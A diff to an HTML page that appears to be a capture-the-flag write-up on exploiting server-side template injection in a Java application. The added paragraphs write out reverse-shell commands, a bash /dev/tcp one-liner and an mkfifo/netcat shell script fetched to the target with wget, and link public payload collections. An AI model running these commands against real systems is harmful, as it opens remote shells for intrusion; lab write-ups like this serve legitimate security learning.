@@ -20,7 +20,8 @@
        
     .centerimg {
       text-align: center;
-      Padding: 75px,75px,75px,75px;
+      margin-top: 75px;
+      margin-bottom: 75px;
     }
     
   </style>
@@ -44,6 +45,11 @@
   <p1>Eventually I came accross *{7*7}. Simply replace '$' with '*'<br>
   <div class="centerimg">
     <img src="docs/assets/seven.png">
+  </div>
+  <p1>The application is susceptible to SSTI. Now we need to figure out the correct payload in order to catch a shell. Using "bash -i >& /dev/tcp/10.10.16.4/6666 0>&1" won't work. I believe this has something to do with the /dev/tcp directory being absent on linux VMs. Someone correct me on this. I tried various payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java"</a>. Searching through github, I found an SSTI payload generator here:<a href="https://github.com/VikasVarshney/ssti-payload"</a><br>
+  <p1>After a while of playing around with various commands, I decided to wget an ‘.sh’ file to the target via a local http server. The script contained rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc [my IP] [port] > /tmp/f ; NO brackets. I was able to execute the file in the target directory by executing the file with the bash command. Connected to a netcat listener, thus establishing a reverse shell. "this.sh" contains the following payload: "rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc [my IP] [port] > /tmp/f"<br>
+  <div class="centerimg">
+    <img src="docs/assets/this.png">
   </div>
 </body>
 </html>
